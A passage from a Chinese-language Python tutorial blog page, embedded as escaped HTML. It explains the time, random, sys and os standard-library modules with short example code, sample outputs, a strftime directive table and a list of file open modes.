将当前时间转换为指定格式的字符串</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.strftime(<span class=\"string\">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>))</span><br><span class=\"line\">st = <span class=\"string\">&#x27;2018年3月20日&#x27;</span></span><br><span class=\"line\"><span class=\"comment\"># 将指定时间字符串恢复成struct_time对象。</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.strptime(st, <span class=\"string\">&#x27;%Y年%m月%d日&#x27;</span>))</span><br><span class=\"line\"><span class=\"comment\"># 返回从1970年1970年1月1日0点整到现在过了多少秒。</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.time())</span><br><span class=\"line\"><span class=\"comment\"># 返回本地时区的时间偏移，以秒为单位</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(time.timezone) <span class=\"comment\"># 在国内东八区输出-28800</span></span><br></pre></td></tr></table></figure>\n\n<p>运行上面程序，可以看到如下输出结果：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Fri Feb <span class=\"number\">22</span> <span class=\"number\">11</span>:<span class=\"number\">28</span>:<span class=\"number\">39</span> <span class=\"number\">2019</span></span><br><span class=\"line\">Mon Feb  <span class=\"number\">4</span> <span class=\"number\">11</span>:08:<span class=\"number\">23</span> <span class=\"number\">2018</span></span><br><span class=\"line\">Thu Jan  <span class=\"number\">1</span> 08:<span class=\"number\">00</span>:<span class=\"number\">30</span> <span class=\"number\">1970</span></span><br><span class=\"line\">time.struct_time(tm_year=<span class=\"number\">1970</span>, tm_mon=<span class=\"number\">1</span>, tm_mday=<span class=\"number\">1</span>, tm_hour=<span class=\"number\">0</span>, tm_min=<span class=\"number\">0</span>, tm_sec=<span class=\"number\">30</span>, tm_wday=<span class=\"number\">3</span>, tm_yday=<span class=\"number\">1</span>, </span><br><span class=\"line\">tm_isdst=<span class=\"number\">0</span>)</span><br><span class=\"line\">time.struct_time(tm_year=<span class=\"number\">2019</span>, tm_mon=<span class=\"number\">2</span>, tm_mday=<span class=\"number\">22</span>, tm_hour=<span class=\"number\">3</span>, tm_min=<span class=\"number\">28</span>, tm_sec=<span class=\"number\">39</span>, tm_wday=<span class=\"number\">4</span>, tm_yday=<span class=\"number\">53</span>, </span><br><span class=\"line\">tm_isdst=<span class=\"number\">0</span>)</span><br><span class=\"line\">time.struct_time(tm_year=<span class=\"number\">1970</span>, tm_mon=<span class=\"number\">1</span>, tm_mday=<span class=\"number\">1</span>, tm_hour=<span class=\"number\">8</span>, tm_min=<span class=\"number\">0</span>, tm_sec=<span class=\"number\">30</span>, tm_wday=<span class=\"number\">3</span>, tm_yday=<span class=\"number\">1</span>, </span><br><span class=\"line\">tm_isdst=<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"number\">1517713703.0</span></span><br><span class=\"line\"><span class=\"number\">0.0</span></span><br><span class=\"line\"><span class=\"number\">0.140625</span></span><br><span class=\"line\"><span class=\"number\">2019</span>-02-<span class=\"number\">22</span> <span class=\"number\">11</span>:<span class=\"number\">28</span>:<span class=\"number\">39</span></span><br><span class=\"line\">time.struct_time(tm_year=<span class=\"number\">2018</span>, tm_mon=<span class=\"number\">3</span>, tm_mday=<span class=\"number\">20</span>, tm_hour=<span class=\"number\">0</span>, tm_min=<span class=\"number\">0</span>, tm_sec=<span class=\"number\">0</span>, tm_wday=<span class=\"number\">1</span>, tm_yday=<span class=\"number\">79</span>, </span><br><span class=\"line\">tm_isdst=-<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"number\">1550806119.4960592</span></span><br><span class=\"line\">-<span class=\"number\">28800</span></span><br></pre></td></tr></table></figure>\n\n<p>time 模块中的 strftime() 和 strptime() 两个函数互为逆函数，其中 strftime() 用于将 struct_time 对象或时间元组转换为时间字符串；而 strptime() 函数用于将时间字符串转换为 struct_time  对象。这两个函数都涉及编写格式模板，比如上面程序中使用 %Y 代表年、%m 代表月、%d 代表日、%H 代表时、%M 代表分、%S  代表秒。这两个函数所需要的时间格式字符串支持的指令如下表所示：</p>\n<table>\n<thead>\n<tr>\n<th>指 令</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>%a</td>\n<td>本地化的星期几的缩写名，比如 Sun 代表星期天</td>\n</tr>\n<tr>\n<td>%A</td>\n<td>本地化的星期几的完整名</td>\n</tr>\n<tr>\n<td>%b</td>\n<td>本地化的月份的缩写名，比如 Jan 代表一月</td>\n</tr>\n<tr>\n<td>%B</td>\n<td>本地化的月份的完整名</td>\n</tr>\n<tr>\n<td>%c</td>\n<td>本地化的日期和时间的表示形式</td>\n</tr>\n<tr>\n<td>%d</td>\n<td>代表一个月中第几天的数值，范固： 01~31</td>\n</tr>\n<tr>\n<td>%H</td>\n<td>代表 24 小时制的小时，范围：00~23</td>\n</tr>\n<tr>\n<td>%I</td>\n<td>代表 12 小时制的小时，范围：01~12</td>\n</tr>\n<tr>\n<td>%j</td>\n<td>一年中第几天，范围：001~366</td>\n</tr>\n<tr>\n<td>%m</td>\n<td>代表月份的数值，范围：01~12</td>\n</tr>\n<tr>\n<td>%M</td>\n<td>代表分钟的数值，范围：00~59</td>\n</tr>\n<tr>\n<td>%p</td>\n<td>上午或下午的本地化方式。当使用 strptime() 函数并使用 %I 指令解析小时时，%p 只影响小时字段</td>\n</tr>\n<tr>\n<td>%S</td>\n<td>代表分钟的数值，范围：00<del>61。该范围确实是 00</del>61，60 在表示闰秒的时间戳时有效，而 61 则是由于一些历史原因造成的</td>\n</tr>\n<tr>\n<td>%U</td>\n<td>代表一年中表示第几周，以星期天为每周的第一天，范围：00~53。在这种方式下，一年中第一个星期天被认为处于第一周。当使用 strptime() 函数解析时间字符串时，只有同时指定了星期几和年份该指令才会有效</td>\n</tr>\n<tr>\n<td>%w</td>\n<td>代表星期几的数值，范围：0~6，其中 0 代表周日</td>\n</tr>\n<tr>\n<td>%W</td>\n<td>代表一年小第几周，以星期一为每周的第一天，范围：00~53。在这种方式下，一年中第一个星期一被认为处于第一周。当使用 strptime() 函数解析时间字符串时，只有同时指定了星期几和年份该指令才会有效</td>\n</tr>\n<tr>\n<td>%x</td>\n<td>本地化的日期的表示形式</td>\n</tr>\n<tr>\n<td>%X</td>\n<td>本地化的时间的表示形式</td>\n</tr>\n<tr>\n<td>%y</td>\n<td>年份的缩写，范围：00~99，比如 2018 年就简写成 18</td>\n</tr>\n<tr>\n<td>%Y</td>\n<td>年份的完整形式。如 2018</td>\n</tr>\n<tr>\n<td>%z</td>\n<td>显示时区偏移</td>\n</tr>\n<tr>\n<td>%Z</td>\n<td>时区名（如果时区不行在，则显示为空）</td>\n</tr>\n<tr>\n<td>%%</td>\n<td>用于代表%符号</td>\n</tr>\n</tbody></table>\n<h3 id=\"random-模块\"><a href=\"#random-模块\" class=\"headerlink\" title=\"random 模块\"></a>random 模块</h3><p> ython中的random模块用于生成随机数。</p>\n<p>下面具体介绍random模块的功能：</p>\n<p>1.random.random()</p>\n<p> #用于生成一个0到1的</p>\n<p>随机浮点数：0&lt;= n &lt; 1.0</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random  </span><br><span class=\"line\"><span class=\"number\">2</span> a = random.random()</span><br><span class=\"line\"><span class=\"number\">3</span> <span class=\"built_in\">print</span> (a)  </span><br></pre></td></tr></table></figure>\n\n<p>2.random.uniform(a,b) </p>\n<p>#用于生成一个指定范围内的随机符点数，两个参数其中一个是上限，一个是下限。如果a &gt; b，则生成的随机数n: b &lt;= n &lt;= a。如果 a &lt;b， 则 a &lt;= n &lt;= b。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random  </span><br><span class=\"line\"><span class=\"number\">2</span> <span class=\"built_in\">print</span>(random.uniform(<span class=\"number\">1</span>,<span class=\"number\">10</span>))  </span><br><span class=\"line\"><span class=\"number\">3</span> <span class=\"built_in\">print</span>(random.uniform(<span class=\"number\">10</span>,<span class=\"number\">1</span>)) </span><br></pre></td></tr></table></figure>\n\n<p>3.random.randint(a, b)</p>\n<p> #用于生成一个指定范围内的整数。其中参数a是下限，参数b是上限，生成的随机数n: a &lt;= n &lt;= b</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random  </span><br><span class=\"line\"><span class=\"number\">2</span> <span class=\"built_in\">print</span>(random.randint(<span class=\"number\">1</span>,<span class=\"number\">10</span>))  </span><br></pre></td></tr></table></figure>\n\n<p>4.random.randrange([start], stop[, step])</p>\n<p> #从指定范围内，按指定基数递增的集合中 获取一个随机数。</p>\n<p>random.randrange(10, 30, 2)，结果相当于从[10, 12, 14, 16, … 26, 28]序列中获取一个随机数。</p>\n<p>random.randrange(10, 30, 2)在结果上与 random.choice(range(10, 30, 2) 等效。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random  </span><br><span class=\"line\"><span class=\"number\">2</span> <span class=\"built_in\">print</span>(random.randrange(<span class=\"number\">10</span>,<span class=\"number\">30</span>,<span class=\"number\">2</span>))</span><br></pre></td></tr></table></figure>\n\n<p> 5.random.choice(sequence)</p>\n<p>#random.choice从序列中获取一个随机元素。其函数原型为：random.choice(sequence)。</p>\n<p>参数sequence表示一个有序类型。这里要说明 一下：sequence在python不是一种特定的类型，而是泛指一系列的类型。list, tuple, 字符串都属于sequence。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random  </span><br><span class=\"line\"><span class=\"number\">2</span> lst = [<span class=\"string\">&#x27;python&#x27;</span>,<span class=\"string\">&#x27;C&#x27;</span>,<span class=\"string\">&#x27;C++&#x27;</span>,<span class=\"string\">&#x27;javascript&#x27;</span>]  </span><br><span class=\"line\"><span class=\"number\">3</span> str1 = (<span class=\"string\">&#x27;I love python&#x27;</span>)  </span><br><span class=\"line\"><span class=\"number\">4</span> <span class=\"built_in\">print</span>(random.choice(lst))</span><br><span class=\"line\"><span class=\"number\">5</span> <span class=\"built_in\">print</span>(random.choice(str1))  </span><br></pre></td></tr></table></figure>\n\n<p>6.random.shuffle(x[, random])</p>\n<p>#用于将一个列表中的元素打乱,即将列表内的元素随机排列。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"number\">2</span> p = [<span class=\"string\">&#x27;A&#x27;</span> , <span class=\"string\">&#x27;B&#x27;</span>, <span class=\"string\">&#x27;C&#x27;</span>, <span class=\"string\">&#x27;D&#x27;</span>, <span class=\"string\">&#x27;E&#x27;</span> ]</span><br><span class=\"line\"><span class=\"number\">3</span> random.shuffle(p)  </span><br><span class=\"line\"><span class=\"number\">4</span> <span class=\"built_in\">print</span> (p)  </span><br></pre></td></tr></table></figure>\n\n<p>7.random.sample(sequence, k)</p>\n<p>#从指定序列中随机获取指定长度的片断并随机排列。注意：sample函数不会修改原有序列。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"keyword\">import</span> random   </span><br><span class=\"line\"><span class=\"number\">2</span> lst = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>]  </span><br><span class=\"line\"><span class=\"number\">3</span> <span class=\"built_in\">print</span>(random.sample(lst,<span class=\"number\">4</span>))  </span><br><span class=\"line\"><span class=\"number\">4</span> <span class=\"built_in\">print</span>(lst) </span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"sys模块\"><a href=\"#sys模块\" class=\"headerlink\" title=\"sys模块\"></a>sys模块</h3><h4 id=\"python之sys模块详解\"><a href=\"#python之sys模块详解\" class=\"headerlink\" title=\"python之sys模块详解\"></a>python之sys模块详解</h4><p>sys模块功能多，我们这里介绍一些比较实用的功能，相信你会喜欢的，和我一起走进python的模块吧！</p>\n<h4 id=\"sys模块的常见函数列表\"><a href=\"#sys模块的常见函数列表\" class=\"headerlink\" title=\"sys模块的常见函数列表\"></a>sys模块的常见函数列表</h4><ul>\n<li><code>sys.argv</code>: 实现从程序外部向程序传递参数。</li>\n<li><code>sys.exit([arg])</code>: 程序中间的退出，arg=0为正常退出。</li>\n<li><code>sys.getdefaultencoding()</code>: 获取系统当前编码，一般默认为ascii。</li>\n<li><code>sys.setdefaultencoding()</code>: 设置系统默认编码，执行dir（sys）时不会看到这个方法，在解释器中执行不通过，可以先执行reload(sys)，在执行 setdefaultencoding(‘utf8’)，此时将系统默认编码设置为utf8。（见设置系统默认编码 ）</li>\n<li><code>sys.getfilesystemencoding()</code>: 获取文件系统使用编码方式，Windows下返回’mbcs’，mac下返回’utf-8’.</li>\n<li><code>sys.path</code>: 获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。</li>\n<li><code>sys.platform</code>: 获取当前系统平台。</li>\n<li><code>sys.stdin,sys.stdout,sys.stderr</code>: stdin , stdout ,  以及stderr 变量包含与标准I/O 流对应的流对象. 如果需要更好地控制输出,而print 不能满足你的要求, 它们就是你所需要的.  你也可以替换它们, 这时候你就可以重定向输出和输入到其它设备( device ), 或者以非标准的方式处理它们</li>\n</ul>\n<h4 id=\"sys-argv\"><a href=\"#sys-argv\" class=\"headerlink\" title=\"sys.argv\"></a>sys.argv</h4><p>功能：在外部向程序内部传递参数<br> 示例：<code>sys.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"built_in\">print</span> sys.argv[<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span> sys.argv[<span class=\"number\">1</span>]</span><br></pre></td></tr></table></figure>\n\n<p>运行：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># python sys.py argv1</span></span><br><span class=\"line\">sys.py</span><br><span class=\"line\">argv1</span><br></pre></td></tr></table></figure>\n\n<p>自己动手尝试一下，领悟参数对应关系</p>\n<h4 id=\"sys-exit-n\"><a href=\"#sys-exit-n\" class=\"headerlink\" title=\"sys.exit(n)\"></a>sys.exit(n)</h4><p>功能：执行到主程序末尾，解释器自动退出，但是如果需要中途退出程序，可以调用sys.exit函数，带有一个可选的整数参数返回给调用它的程序，表示你可以在主程序中捕获对sys.exit的调用。（0是正常退出，其他为异常）</p>\n<p>示例：<code>exit.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exitfunc</span>(<span class=\"params\">value</span>):</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span> value</span><br><span class=\"line\">\tsys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;hello&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">\tsys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">except</span> SystemExit,value:</span><br><span class=\"line\">\texitfunc(value)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;come?&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>运行：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># python exit.py</span></span><br><span class=\"line\">hello</span><br><span class=\"line\"><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"sys-path\"><a href=\"#sys-path\" class=\"headerlink\" title=\"sys.path\"></a>sys.path</h4><p>功能：获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。</p>\n<p>示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>sys.path</span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/plat-x86_64-linux-gnu&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/lib-tk&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/lib-old&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/lib-dynload&#x27;</span>, <span class=\"string\">&#x27;/usr/local/lib/python2.7/dist-packages&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/dist-packages&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/dist-packages/PILcompat&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/dist-packages/gtk-2.0&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/dist-packages/ubuntu-sso-client&#x27;</span>]</span><br><span class=\"line\">sys.path.append(<span class=\"string\">&quot;自定义模块路径&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"sys-modules\"><a href=\"#sys-modules\" class=\"headerlink\" title=\"sys.modules\"></a>sys.modules</h4><p>功能：<code>sys.modules</code>是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，<code>sys.modules</code>将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。它拥有字典所拥有的一切方法。</p>\n<p>示例：<code>modules.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> sys.modules.keys()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> sys.modules.values()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> sys.modules[<span class=\"string\">&quot;os&quot;</span>]</span><br></pre></td></tr></table></figure>\n\n<p>运行：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python modules.py</span><br><span class=\"line\">[<span class=\"string\">&#x27;copy_reg&#x27;</span>, <span class=\"string\">&#x27;sre_compile&#x27;</span>, <span class=\"string\">&#x27;_sre&#x27;</span>, <span class=\"string\">&#x27;encodings&#x27;</span>, <span class=\"string\">&#x27;site&#x27;</span>, <span class=\"string\">&#x27;__builtin__&#x27;</span>,......</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"sys-stdin-stdout-stderr\"><a href=\"#sys-stdin-stdout-stderr\" class=\"headerlink\" title=\"sys.stdin\\stdout\\stderr\"></a>sys.stdin\\stdout\\stderr</h4><p>功能：stdin , stdout , 以及stderr 变量包含与标准I/O 流对应的流对象. 如果需要更好地控制输出,而print  不能满足你的要求, 它们就是你所需要的. 你也可以替换它们, 这时候你就可以重定向输出和输入到其它设备( device ),  或者以非标准的方式处理它们</p>\n<p>勿忘初心，放得始终 (ง •_•)ง！</p>\n<h3 id=\"os模块\"><a href=\"#os模块\" class=\"headerlink\" title=\"os模块\"></a>os模块</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">os.sep:取代操作系统特定的路径分隔符</span><br><span class=\"line\">os.name:指示你正在使用的工作平台。比如对于Windows，它是<span class=\"string\">&#x27;nt&#x27;</span>，而对于Linux/Unix用户，它是<span class=\"string\">&#x27;posix&#x27;</span>。</span><br><span class=\"line\">os.getcwd:得到当前工作目录，即当前python脚本工作的目录路径。</span><br><span class=\"line\">os.getenv()和os.putenv:分别用来读取和设置环境变量</span><br><span class=\"line\">os.listdir():返回指定目录下的所有文件和目录名</span><br><span class=\"line\">os.remove(file):删除一个文件</span><br><span class=\"line\">os.stat（file）:获得文件属性</span><br><span class=\"line\">os.chmod(file):修改文件权限和时间戳</span><br><span class=\"line\">os.mkdir(name):创建目录</span><br><span class=\"line\">os.rmdir(name):删除目录</span><br><span class=\"line\">os.removedirs（r“c：\\python”）:删除多个目录</span><br><span class=\"line\">os.system():运行shell命令</span><br><span class=\"line\">os.exit():终止当前进程</span><br><span class=\"line\">os.linesep:给出当前平台的行终止符。例如，Windows使用<span class=\"string\">&#x27;\\r\\n&#x27;</span>，Linux使用<span class=\"string\">&#x27;\\n&#x27;</span>而Mac使用<span class=\"string\">&#x27;\\r&#x27;</span></span><br><span class=\"line\">os.path.split():返回一个路径的目录名和文件名</span><br><span class=\"line\">os.path.isfile()和os.path.isdir()分别检验给出的路径是一个目录还是文件</span><br><span class=\"line\">os.path.existe():检验给出的路径是否真的存在</span><br><span class=\"line\">os.listdir(dirname):列出dirname下的目录和文件</span><br><span class=\"line\">os.getcwd():获得当前工作目录</span><br><span class=\"line\">os.curdir:返回当前目录（<span class=\"string\">&#x27;.&#x27;</span>）</span><br><span class=\"line\">os.chdir(dirname):改变工作目录到dirname</span><br><span class=\"line\">os.path.isdir(name):判断name是不是目录，不是目录就返回false</span><br><span class=\"line\">os.path.isfile(name):判断name这个文件是否存在，不存在返回false</span><br><span class=\"line\">os.path.exists(name):判断是否存在文件或目录name</span><br><span class=\"line\">os.path.getsize(name):或得文件大小，如果name是目录返回<span class=\"number\">0L</span></span><br><span class=\"line\">os.path.abspath(name):获得绝对路径</span><br><span class=\"line\">os.path.isabs():判断是否为绝对路径</span><br><span class=\"line\">os.path.normpath(path):规范path字符串形式</span><br><span class=\"line\">os.path.split(name):分割文件名与目录（事实上，如果你完全使用目录，它也会将最后一个目录作为文件名而分离，同时它不会判断文件或目录是否存在）</span><br><span class=\"line\">os.path.splitext():分离文件名和扩展名</span><br><span class=\"line\">os.path.join(path,name):连接目录与文件名或目录</span><br><span class=\"line\">os.path.basename(path):返回文件名</span><br><span class=\"line\">os.path.dirname(path):返回文件路径</span><br></pre></td></tr></table></figure>\n\n<p>文件操作：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">os.mknod(<span class=\"string\">&quot;text.txt&quot;</span>)：创建空文件</span><br><span class=\"line\">fp = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;text.txt&quot;</span>,w):直接打开一个文件，如果文件不存在就创建文件</span><br></pre></td></tr></table></figure>\n\n<p>open 模式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">w 写方式</span><br><span class=\"line\">a 追加模式打开（从EOF开始，必要时创建新文件）</span><br><span class=\"line\">r+ 以读写模式打开</span><br><span class=\"line\">w+ 以读写模式打开</span><br><span class=\"line\">a+ 以读写模式打开</span><br><span class=\"line\">rb 以二进制读模式打开</span><br><span class=\"line\">wb 以二进制写模式打开 (参见 w )</span><br><span class=\"line\">ab 以二进制追加模式打开 (参见 a )</span><br><span class=\"line\">rb+ 以二进制读写模式打开 (参见 r+ )</span><br><span class=\"line\">wb+ 以二进制读写模式打开 (参见 w+ )</span><br><span class=\"line\">ab+ 以二进制读写模式打开 (参见 a+ )</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fp.read([size])  <span class=\"comment\">#size为读取的长度，以byte为单位</span></span><br><span class=\"line\"> </span><br><span class=\"line\">fp.readline([size])  <span class=\"comment\">#读一行，如果定义了size，有可能返回的只是一行的一部分</span></span><br><span 